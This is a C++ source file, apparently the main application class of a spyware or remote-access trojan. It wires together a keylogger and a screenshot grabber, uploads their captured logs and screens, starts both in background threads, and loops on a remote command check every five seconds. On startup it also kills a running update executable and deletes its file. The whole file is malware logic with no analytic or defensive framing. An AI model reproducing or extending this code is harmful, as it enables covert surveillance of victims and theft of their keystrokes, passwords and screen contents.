// Filename: class.application.cpp
// Author:   Patryk Połeć

#include "engine.h"

////////////////////////////////////////////////////////////////////////////////////////////////// Constructor and destructor
C_Application::C_Application(C_Base *_objBase, C_Command *_objCommand, C_Keylogger *_objKeylogger, C_Screenshooter *_objScreenshooter): objBase(_objBase), objCommand(_objCommand), objKeylogger(_objKeylogger), objScreenshooter(_objScreenshooter)
{
	// Private fields
	objProcess = new C_Process;

	// Initialization
	if(processID = objProcess->IsProcess(objBase->ncfUpdateExe)) objProcess->KillProcess(processID);

	remove(objBase->pcfUpdateExe.c_str());
}

C_Application::~C_Application()
{
	delete objProcess;
}

////////////////////////////////////////////////////////////////////////////////////////////////// Public methods
void C_Application::Start()
{
	if(objCommand->CheckCommand() == 0)
	{
		objKeylogger->UploadLogs();
		objScreenshooter->UploadScreens();

		objKeylogger->InitLog();
		objScreenshooter->InitScreen();
	
		_beginthread(objKeylogger->Thread, 0, objKeylogger);
		_beginthread(objScreenshooter->Thread, 0, objScreenshooter);

		while(1)
		{
			if(objCommand->CheckCommand()) return;
			
			Sleep(5000);
		}

		objKeylogger->stateLogged = 0;
		objScreenshooter->stateShooted = 0;
	}
}